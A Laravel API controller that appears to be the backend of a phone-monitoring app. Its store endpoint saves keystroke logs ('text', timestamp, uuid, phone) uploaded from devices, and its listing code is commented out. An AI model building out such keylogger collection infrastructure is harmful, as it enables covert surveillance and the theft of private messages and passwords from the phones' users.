<?php

namespace App\Http\Controllers\api;

use App\Http\Resources\CallLogResource;
use App\Models\Phone;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Validator;
use App\Models\KeyLogger;
use Yajra\DataTables\DataTables;

class KeyLoggerController extends BaseController
{
    /**
     * Display a listing of the resource.
     */
    public function index(Request $request)
    {
        /*if ($request->ajax()) {

            if ($request->get("id")) {
                $id = $request->get("id");
                //$phone = Phone::query()->find($id);
                $keyloggers = KeyLogger::query()
                    ->latest()
                    ->where("phone", $id)
                    ->orderByDesc("id")
                    ->get();


                return DataTables::of($keyloggers)
                    ->addIndexColumn()
                    ->rawColumns(['action'])
                    ->make(true);

            }
        }*/
    }

    /**
     * Show the form for creating a new resource.
     */
    public function create()
    {
        //
    }

    /**
     * Store a newly created resource in storage.
     */
    public function store(Request $request)
    {
        $input = $request->all();

        $validator = Validator::make($input, [
            'text' => 'required',
            'dateTime' => 'required',
            'uuid' => 'required',
            'phone' => 'required',
        ]);

        if ($validator->fails()) {
            return $this->sendError('Validation Error.', $validator->errors());
        }

        $call = KeyLogger::query()->where("uuid", $input["uuid"])->first();
        if (is_null($call)) {
            $call = KeyLogger::create($input);
        }

        return $this->sendResponse(new CallLogResource($call), 'KeyLog added.');
    }

    /**
     * Display the specified resource.
     */
    public function show(string $id)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     */
    public function edit(string $id)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     */
    public function update(Request $request, string $id)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     */
    public function destroy(string $id)
    {
        //
    }
}
